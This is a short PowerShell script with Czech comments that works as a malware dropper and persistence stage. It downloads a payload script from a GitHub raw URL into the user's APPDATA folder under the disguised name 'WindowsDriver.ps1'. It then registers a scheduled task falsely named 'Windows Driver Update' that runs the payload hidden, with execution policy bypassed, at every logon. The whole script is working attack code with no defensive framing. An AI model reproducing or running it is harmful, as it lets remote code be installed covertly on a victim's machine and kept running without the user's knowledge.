# 1. Stáhni payload
$payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1" 
$localPath = "$env:APPDATA\WindowsDriver.ps1"
Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath

# 2. Nastav persistenci (např. pomocí Scheduled Task)
$taskName = "Windows Driver Update"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File "$localPath""
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "System driver check" -Force
